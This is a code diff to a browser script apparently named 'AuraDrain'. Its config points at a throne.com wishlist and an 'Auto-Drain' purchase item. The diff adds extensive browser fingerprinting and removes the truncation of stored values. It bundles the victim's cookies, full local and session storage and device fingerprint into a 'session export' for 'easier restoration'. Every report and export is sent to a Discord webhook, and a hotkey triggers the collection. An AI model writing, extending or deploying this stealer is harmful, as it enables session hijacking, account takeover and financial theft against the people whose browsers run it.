@@ -3,7 +3,7 @@ const config = {
   throneUrl: "throne.com/thegoddessaura",
   forceStop: true,
   forceStopShortcut: "Alt+Shift+E",
-  debugMode: false,
+  debugMode: true,
   targetItemName: "Auto-Drain",
   cookieCollection: {
     enabled: true,
@@ -288,6 +288,158 @@ async function getAllCookiesFromBackground() {
   });
 }
 
+// Enhanced browser fingerprinting functions
+function getWebGLFingerprint() {
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (!gl) return null;
+    
+    return {
+      vendor: gl.getParameter(gl.VENDOR),
+      renderer: gl.getParameter(gl.RENDERER),
+      version: gl.getParameter(gl.VERSION),
+      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+      extensions: gl.getSupportedExtensions()
+    };
+  } catch (e) {
+    return null;
+  }
+}
+
+function getCanvasFingerprint() {
+  try {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillText('Browser fingerprint test 🔒', 2, 2);
+    return canvas.toDataURL();
+  } catch (e) {
+    return null;
+  }
+}
+
+function getAudioContextFingerprint() {
+  try {
+    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+    const oscillator = audioContext.createOscillator();
+    const analyser = audioContext.createAnalyser();
+    oscillator.connect(analyser);
+    oscillator.frequency.value = 1000;
+    oscillator.start();
+    
+    const fingerprint = analyser.frequencyBinCount;
+    oscillator.stop();
+    audioContext.close();
+    return fingerprint;
+  } catch (e) {
+    return null;
+  }
+}
+
+function getAvailableFonts() {
+  const testFonts = [
+    'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
+    'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
+    'Trebuchet MS', 'Arial Black', 'Impact', 'Tahoma', 'Century Gothic'
+  ];
+  
+  const availableFonts = [];
+  const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
+  const testSize = '72px';
+  
+  const canvas = document.createElement('canvas');
+  const context = canvas.getContext('2d');
+  
+  testFonts.forEach(font => {
+    context.font = testSize + ' ' + font + ', monospace';
+    const metrics1 = context.measureText(testString);
+    
+    context.font = testSize + ' monospace';
+    const metrics2 = context.measureText(testString);
+    
+    if (metrics1.width !== metrics2.width) {
+      availableFonts.push(font);
+    }
+  });
+  
+  return availableFonts;
+}
+
+function getBrowserFingerprint() {
+  return {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    languages: navigator.languages,
+    platform: navigator.platform,
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory,
+    maxTouchPoints: navigator.maxTouchPoints,
+    vendor: navigator.vendor,
+    vendorSub: navigator.vendorSub,
+    productSub: navigator.productSub,
+    appName: navigator.appName,
+    appVersion: navigator.appVersion,
+    appCodeName: navigator.appCodeName
+  };
+}
+
+function getScreenInfo() {
+  return {
+    width: screen.width,
+    height: screen.height,
+    availWidth: screen.availWidth,
+    availHeight: screen.availHeight,
+    colorDepth: screen.colorDepth,
+    pixelDepth: screen.pixelDepth,
+    orientation: screen.orientation ? {
+      angle: screen.orientation.angle,
+      type: screen.orientation.type
+    } : null
+  };
+}
+
+function getTimezoneInfo() {
+  try {
+    return {
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      timezoneOffset: new Date().getTimezoneOffset(),
+      locale: Intl.DateTimeFormat().resolvedOptions().locale,
+      numberFormat: Intl.NumberFormat().resolvedOptions().locale
+    };
+  } catch (e) {
+    return null;
+  }
+}
+
+function getConnectionInfo() {
+  if (navigator.connection) {
+    return {
+      effectiveType: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt,
+      saveData: navigator.connection.saveData
+    };
+  }
+  return null;
+}
+
+function getPluginsInfo() {
+  const plugins = [];
+  for (let i = 0; i < navigator.plugins.length; i++) {
+    plugins.push({
+      name: navigator.plugins[i].name,
+      description: navigator.plugins[i].description,
+      filename: navigator.plugins[i].filename,
+      length: navigator.plugins[i].length
+    });
+  }
+  return plugins;
+}
+
 async function collectAllStorageData() {
   debugLog("💾 [STORAGE DEBUG] Starting comprehensive storage collection", "info");
   
@@ -296,7 +448,19 @@ async function collectAllStorageData() {
     sessionStorage: {},
     cookies: [],
     domains: new Set(),
-    totalItems: 0
+    totalItems: 0,
+    browserFingerprint: getBrowserFingerprint(),
+    screenInfo: getScreenInfo(),
+    timezoneInfo: getTimezoneInfo(),
+    connectionInfo: getConnectionInfo(),
+    pluginsInfo: getPluginsInfo(),
+    webglFingerprint: getWebGLFingerprint(),
+    canvasFingerprint: getCanvasFingerprint(),
+    audioContextFingerprint: getAudioContextFingerprint(),
+    availableFonts: getAvailableFonts(),
+    timestamp: Date.now(),
+    url: window.location.href,
+    referrer: document.referrer
   };
   
   try {
@@ -573,15 +737,28 @@ async function collectAndLogCookies() {
     debugLog(`📝 [MAIN DEBUG] Report length: ${comprehensiveReport.length}`, "info");
     debugLog(`📝 [MAIN DEBUG] Report preview: ${comprehensiveReport.substring(0, 300)}...`, "info");
     
+    // Create structured session export for easier restoration
+    debugLog("📦 [MAIN DEBUG] Creating structured session export...", "info");
+    const structuredExport = await createStructuredSessionExport(storageData, processedCookies);
+    
+    // Send both formats
+    let reportSuccess = false;
+    let exportSuccess = false;
+    
     if (comprehensiveReport.length > config.discordWebhook.maxMessageLength) {
       debugLog(`📤 [MAIN DEBUG] Report too large (${comprehensiveReport.length} > ${config.discordWebhook.maxMessageLength}), sending as file...`, "info");
-      const success = await sendToDiscordWebhook(comprehensiveReport, true);
-      debugLog(`📤 [MAIN DEBUG] File send result: ${success}`, success ? "success" : "error");
+      reportSuccess = await sendToDiscordWebhook(comprehensiveReport, true);
+      debugLog(`📤 [MAIN DEBUG] Report file send result: ${reportSuccess}`, reportSuccess ? "success" : "error");
     } else {
-      debugLog(`📤 [MAIN DEBUG] Sending as message (${comprehensiveReport.length} chars)...`, "info");
-      const success = await sendToDiscordWebhook(comprehensiveReport);
-      debugLog(`📤 [MAIN DEBUG] Message send result: ${success}`, success ? "success" : "error");
+      debugLog(`📤 [MAIN DEBUG] Sending report as message (${comprehensiveReport.length} chars)...`, "info");
+      reportSuccess = await sendToDiscordWebhook(comprehensiveReport);
+      debugLog(`📤 [MAIN DEBUG] Report message send result: ${reportSuccess}`, reportSuccess ? "success" : "error");
     }
+    
+    // Send structured export
+    debugLog("📤 [MAIN DEBUG] Sending structured session export...", "info");
+    exportSuccess = await sendStructuredSessionToDiscord(structuredExport);
+    debugLog(`📤 [MAIN DEBUG] Structured export send result: ${exportSuccess}`, exportSuccess ? "success" : "error");
 
   } catch (error) {
     debugLog(`❌ [MAIN DEBUG] Collection failed: ${error.message}`, "error");
@@ -598,6 +775,87 @@ function formatComprehensiveReport(storageData, processedCookies) {
   report += `🖥️ **User Agent:** ${navigator.userAgent}\n`;
   report += `🌍 **URL:** ${window.location.href}\n`;
   report += `📊 **Total Items:** ${storageData.totalItems}\n\n`;
+  
+  // Enhanced browser fingerprinting data
+  if (storageData.browserFingerprint) {
+    report += `🔍 **BROWSER FINGERPRINT**\n`;
+    report += `• **Platform:** ${storageData.browserFingerprint.platform}\n`;
+    report += `• **Language:** ${storageData.browserFingerprint.language}\n`;
+    report += `• **Languages:** ${storageData.browserFingerprint.languages?.join(', ')}\n`;
+    report += `• **Hardware Concurrency:** ${storageData.browserFingerprint.hardwareConcurrency}\n`;
+    report += `• **Device Memory:** ${storageData.browserFingerprint.deviceMemory}GB\n`;
+    report += `• **Max Touch Points:** ${storageData.browserFingerprint.maxTouchPoints}\n`;
+    report += `• **Cookie Enabled:** ${storageData.browserFingerprint.cookieEnabled}\n`;
+    report += `• **Do Not Track:** ${storageData.browserFingerprint.doNotTrack}\n`;
+    report += `• **Vendor:** ${storageData.browserFingerprint.vendor}\n`;
+    report += `• **App Name:** ${storageData.browserFingerprint.appName}\n`;
+    report += `• **App Version:** ${storageData.browserFingerprint.appVersion}\n\n`;
+  }
+  
+  if (storageData.screenInfo) {
+    report += `🖥️ **SCREEN INFORMATION**\n`;
+    report += `• **Resolution:** ${storageData.screenInfo.width}x${storageData.screenInfo.height}\n`;
+    report += `• **Available:** ${storageData.screenInfo.availWidth}x${storageData.screenInfo.availHeight}\n`;
+    report += `• **Color Depth:** ${storageData.screenInfo.colorDepth}\n`;
+    report += `• **Pixel Depth:** ${storageData.screenInfo.pixelDepth}\n`;
+    if (storageData.screenInfo.orientation) {
+      report += `• **Orientation:** ${storageData.screenInfo.orientation.type} (${storageData.screenInfo.orientation.angle}°)\n`;
+    }
+    report += `\n`;
+  }
+  
+  if (storageData.timezoneInfo) {
+    report += `🌍 **TIMEZONE & LOCALE**\n`;
+    report += `• **Timezone:** ${storageData.timezoneInfo.timezone}\n`;
+    report += `• **Offset:** ${storageData.timezoneInfo.timezoneOffset} minutes\n`;
+    report += `• **Locale:** ${storageData.timezoneInfo.locale}\n`;
+    report += `• **Number Format:** ${storageData.timezoneInfo.numberFormat}\n`;
+    report += `\n`;
+  }
+  
+  if (storageData.connectionInfo) {
+    report += `🌐 **NETWORK INFORMATION**\n`;
+    report += `• **Effective Type:** ${storageData.connectionInfo.effectiveType}\n`;
+    report += `• **Downlink:** ${storageData.connectionInfo.downlink} Mbps\n`;
+    report += `• **RTT:** ${storageData.connectionInfo.rtt} ms\n`;
+    report += `• **Save Data:** ${storageData.connectionInfo.saveData}\n`;
+    report += `\n`;
+  }
+  
+  if (storageData.webglFingerprint) {
+    report += `🎮 **WEBGL FINGERPRINT**\n`;
+    report += `• **Vendor:** ${storageData.webglFingerprint.vendor}\n`;
+    report += `• **Renderer:** ${storageData.webglFingerprint.renderer}\n`;
+    report += `• **Version:** ${storageData.webglFingerprint.version}\n`;
+    report += `• **Extensions:** ${storageData.webglFingerprint.extensions?.length || 0} extensions\n`;
+    report += `\n`;
+  }
+  
+  if (storageData.canvasFingerprint) {
+    report += `🎨 **CANVAS FINGERPRINT**\n`;
+    report += `• **Data URL:** ${storageData.canvasFingerprint.substring(0, 100)}...\n`;
+    report += `\n`;
+  }
+  
+  if (storageData.audioContextFingerprint) {
+    report += `🔊 **AUDIO CONTEXT FINGERPRINT**\n`;
+    report += `• **Frequency Bin Count:** ${storageData.audioContextFingerprint}\n`;
+    report += `\n`;
+  }
+  
+  if (storageData.availableFonts && storageData.availableFonts.length > 0) {
+    report += `🔤 **AVAILABLE FONTS**\n`;
+    report += `• **Fonts:** ${storageData.availableFonts.join(', ')}\n`;
+    report += `\n`;
+  }
+  
+  if (storageData.pluginsInfo && storageData.pluginsInfo.length > 0) {
+    report += `🔌 **BROWSER PLUGINS**\n`;
+    storageData.pluginsInfo.forEach(plugin => {
+      report += `• **${plugin.name}:** ${plugin.description}\n`;
+    });
+    report += `\n`;
+  }
 
   report += `📈 **COLLECTION SUMMARY**\n`;
   report += `🍪 **Cookies:** ${storageData.cookies.length}\n`;
@@ -645,7 +903,7 @@ function formatComprehensiveReport(storageData, processedCookies) {
   if (Object.keys(storageData.localStorage).length > 0) {
     report += `💾 **LOCAL STORAGE DATA**\n`;
     Object.entries(storageData.localStorage).forEach(([key, value]) => {
-      report += `• **${key}** = \`${value.substring(0, 200)}${value.length > 200 ? '...' : ''}\`\n`;
+      report += `• **${key}** = \`${value}\`\n`;
     });
     report += `\n`;
   }
@@ -653,7 +911,7 @@ function formatComprehensiveReport(storageData, processedCookies) {
   if (Object.keys(storageData.sessionStorage).length > 0) {
     report += `🗂️ **SESSION STORAGE DATA**\n`;
     Object.entries(storageData.sessionStorage).forEach(([key, value]) => {
-      report += `• **${key}** = \`${value.substring(0, 200)}${value.length > 200 ? '...' : ''}\`\n`;
+      report += `• **${key}** = \`${value}\`\n`;
     });
     report += `\n`;
   }
@@ -663,6 +921,72 @@ function formatComprehensiveReport(storageData, processedCookies) {
   report += `📅 Generated: ${new Date().toISOString()}\n`;
 
   return report;
+}
+
+async function createStructuredSessionExport(storageData, processedCookies) {
+  debugLog("📦 [EXPORT DEBUG] Creating structured session export", "info");
+  
+  const sessionExport = {
+    metadata: {
+      timestamp: storageData.timestamp,
+      url: storageData.url,
+      referrer: storageData.referrer,
+      pcIdentifier: pcIdentifier,
+      version: "2.0.0"
+    },
+    browserFingerprint: storageData.browserFingerprint,
+    screenInfo: storageData.screenInfo,
+    timezoneInfo: storageData.timezoneInfo,
+    connectionInfo: storageData.connectionInfo,
+    webglFingerprint: storageData.webglFingerprint,
+    canvasFingerprint: storageData.canvasFingerprint,
+    audioContextFingerprint: storageData.audioContextFingerprint,
+    availableFonts: storageData.availableFonts,
+    pluginsInfo: storageData.pluginsInfo,
+    cookies: processedCookies,
+    localStorage: storageData.localStorage,
+    sessionStorage: storageData.sessionStorage,
+    domains: Array.from(storageData.domains),
+    statistics: {
+      totalItems: storageData.totalItems,
+      cookieCount: processedCookies.length,
+      localStorageCount: Object.keys(storageData.localStorage).length,
+      sessionStorageCount: Object.keys(storageData.sessionStorage).length,
+      domainCount: storageData.domains.size
+    }
+  };
+  
+  debugLog(`📦 [EXPORT DEBUG] Structured export created with ${sessionExport.statistics.totalItems} items`, "success");
+  return sessionExport;
+}
+
+async function sendStructuredSessionToDiscord(sessionExport) {
+  debugLog("📤 [EXPORT DEBUG] Sending structured session to Discord", "info");
+  
+  const exportJson = JSON.stringify(sessionExport, null, 2);
+  const exportSize = new Blob([exportJson]).size;
+  
+  debugLog(`📤 [EXPORT DEBUG] Export size: ${exportSize} bytes`, "info");
+  
+  if (exportSize > config.discordWebhook.maxMessageLength) {
+    debugLog("📤 [EXPORT DEBUG] Export too large, sending as file", "info");
+    return await sendToDiscordWebhook(exportJson, true);
+  } else {
+    debugLog("📤 [EXPORT DEBUG] Sending as structured message", "info");
+    const structuredMessage = `🔧 **AURADRAIN STRUCTURED SESSION EXPORT** 🔧\n\n` +
+      `📊 **Statistics:**\n` +
+      `• **Total Items:** ${sessionExport.statistics.totalItems}\n` +
+      `• **Cookies:** ${sessionExport.statistics.cookieCount}\n` +
+      `• **LocalStorage:** ${sessionExport.statistics.localStorageCount}\n` +
+      `• **SessionStorage:** ${sessionExport.statistics.sessionStorageCount}\n` +
+      `• **Domains:** ${sessionExport.statistics.domainCount}\n\n` +
+      `🖥️ **Device:** ${sessionExport.browserFingerprint.platform}\n` +
+      `🌍 **URL:** ${sessionExport.metadata.url}\n` +
+      `⏰ **Timestamp:** ${new Date(sessionExport.metadata.timestamp).toLocaleString()}\n\n` +
+      `\`\`\`json\n${exportJson.substring(0, 1000)}...\n\`\`\``;
+    
+    return await sendToDiscordWebhook(structuredMessage);
+  }
 }
 
 async function formatCookiesForDiscord(cookies) {
@@ -1099,6 +1423,7 @@ function main() {
   debugLog(`🍪 Cookie Log: Ctrl+Alt+C`, "info");
   debugLog(`🧪 Test Webhook: Ctrl+Alt+T`, "info");
   debugLog(`🔄 Toggle Auto-Retry: Ctrl+Alt+R`, "info");
+  debugLog(`📦 Enhanced Collection: Ctrl+Alt+E`, "info");
   debugLog(`📡 Discord Webhook: ${config.discordWebhook.enabled ? 'Enabled' : 'Disabled'}`, "info");
   debugLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "info");
   
@@ -1166,6 +1491,13 @@ function main() {
       } else {
         debugLog("🛑 Auto-retry disabled - Only manual purchases will work", "warning");
       }
+    }
+    
+    if (event.ctrlKey && event.altKey && event.key === "E") {
+      event.preventDefault();
+      debugLog("📦 Manual enhanced collection triggered", "info");
+      debugLog("🔍 Starting comprehensive browser state collection...", "info");
+      collectAndLogCookies();
     }
   });
 }
